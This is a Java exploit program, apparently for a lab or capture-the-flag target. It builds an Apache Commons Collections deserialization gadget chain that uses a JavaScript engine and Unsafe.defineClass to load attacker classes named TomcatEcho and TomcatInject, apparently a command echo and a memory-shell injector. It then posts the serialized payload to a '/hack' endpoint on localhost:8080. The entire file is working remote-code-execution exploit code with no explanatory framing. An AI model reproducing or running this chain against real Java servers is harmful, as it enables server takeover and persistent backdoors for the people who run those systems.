import javassist.ClassPool;
import okhttp3.FormBody;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import org.joor.Reflect;

import javax.script.ScriptEngineManager;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

public class Exp {
    public static void main(String[] args) throws Exception {
        byte[] bytes1 = ClassPool.getDefault().get("TomcatEcho").toBytecode();
        String step1 = Base64.getEncoder().encodeToString(bytes1);
        sendExp("TomcatEcho", step1);
        byte[] bytes2 = ClassPool.getDefault().get("TomcatInject").toBytecode();
        String step2 = Base64.getEncoder().encodeToString(bytes2);
        sendExp("TomcatInject", step2);
    }

    public static int sendExp(String className, String code) {
        Transformer[] transformers = {
                new InvokerTransformer("eval", new Class[]{String.class}, new Object[]{makeJsDefinedClass(className, code)}),
                new InvokerTransformer("getEngineByName", new Class[]{String.class}, new Object[]{"js"}),
                new InstantiateTransformer(null, null),
                new ConstantTransformer(ScriptEngineManager.class)
        };

        Object gadget = chain(transformers);
        return send(gadget);
    }

    public static String makeJsDefinedClass(String classname, String encoded) {
        return "var data = '" + encoded + "';" +
                "var bytes = java.util.Base64.getDecoder().decode(data);" +
                "var cls = java.lang.Class.forName('sun.nio.ch.Util');" +
                "var method = cls.getDeclaredMethod('unsafe');" +
                "method.setAccessible(true);" +
                "var unsafe = method.invoke(cls);" +
                "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();" +
                "var evil = unsafe.defineClass('" + classname + "', bytes, 0, bytes.length, classLoader, null);" +
                "evil.newInstance();";
    }

    public static Object chain(Transformer... transformers) {
        HashMap<Object, Object> map1 = new HashMap<>();
        map1.put("yy", 1);
        HashMap<Object, Object> map2 = new HashMap<>();
        map2.put("zZ", 1);

        Map lazyMap2 = LazyMap.decorate(map2, new ConstantTransformer(2));
        Hashtable<Object, Object> evil = new Hashtable<>();
        evil.put(map1, 1);
        evil.put(lazyMap2, 2);

        Map<?, ?> map = map2;
        for (Transformer transformer : transformers) {
            map = TransformedMap.decorate(map, null, transformer);
        }

        Reflect.on(lazyMap2).set("map", map);
        map2.remove("yy");

        return evil;
    }

    public static int send(Object gadget) {
        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        try {
            ObjectOutputStream oos = new ObjectOutputStream(outputStream);
            oos.writeObject(gadget);
            oos.flush();
        } catch (Exception e) {
            e.printStackTrace();
        }

        String encodedPayload = Base64.getEncoder().encodeToString(outputStream.toByteArray());

        FormBody formBody = new FormBody.Builder()
                .add("exp", encodedPayload)
                .build();

        HttpUrl url = new HttpUrl.Builder()
                .scheme("http")
                .host("localhost")
                .port(8080)
                .addPathSegment("hack")
                .build();

        Request request = new Request.Builder()
                .url(url)
                .post(formBody)
                .build();

        OkHttpClient client = new OkHttpClient();
        try {
            okhttp3.Response response = client.newCall(request).execute();
            return response.code();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return -1;
    }
}
